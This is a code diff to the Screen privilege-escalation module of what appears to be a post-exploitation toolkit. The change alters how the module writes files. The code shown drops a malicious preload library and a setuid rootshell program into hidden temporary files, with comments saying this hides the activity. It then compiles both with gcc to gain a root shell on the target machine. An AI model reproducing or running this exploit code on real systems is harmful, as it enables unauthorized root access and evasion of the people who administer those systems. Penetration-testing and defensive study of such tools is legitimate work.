@@ -69,10 +69,6 @@ class ScreenMethod(Method):
 
         self.ran_before = True
 
-        writer = gtfobins.Binary.find_capability(self.pty.which, Capability.WRITE)
-        if writer is None:
-            raise PrivescError("no file write methods available from gtfobins")
-
         # Hide the activity by creating hidden temporary files
         libhack_c = (
             self.pty.run("mktemp -t .XXXXXXXXXXX --suffix .c").decode("utf-8").strip()
@@ -86,11 +82,8 @@ class ScreenMethod(Method):
         rootshell = self.pty.run("mktemp -t .XXXXXXXXXXX").decode("utf-8").strip()
 
         # Write the library
-        self.pty.run(
-            writer.write_file(
-                libhack_c,
-                textwrap.dedent(
-                    f"""
+        libhack_source = textwrap.dedent(
+            f"""
                 #include <stdio.h>
                 #include <sys/types.h>
                 #include <unistd.h>
@@ -101,19 +94,17 @@ class ScreenMethod(Method):
                     unlink("/etc/ld.so.preload");
                 }}
                 """
-                ).lstrip(),
-            )
-        )
+        ).lstrip()
+
+        with self.pty.open(libhack_c, "w", length=len(libhack_source)) as filp:
+            filp.write(libhack_source)
 
         # Compile the library
         self.pty.run(f"gcc -fPIC -shared -ldl -o {libhack_so} {libhack_c}")
 
-        # Create the rootshell binary
-        self.pty.run(
-            writer.write_file(
-                rootshell_c,
-                textwrap.dedent(
-                    f"""
+        # Write the rootshell source code
+        rootshell_source = textwrap.dedent(
+            f"""
                 #include <stdio.h>
                 int main(void){{
                     setuid(0);
@@ -123,9 +114,10 @@ class ScreenMethod(Method):
                     execvp("{self.pty.shell}", NULL, NULL);
                 }}
                 """
-                ).lstrip(),
-            )
-        )
+        ).lstrip()
+
+        with self.pty.open(rootshell_c, "w", length=len(rootshell_source)) as filp:
+            filp.write(rootshell_source)
 
         # Compile the rootshell binary
         self.pty.run(f"gcc -o {rootshell} {rootshell_c}")
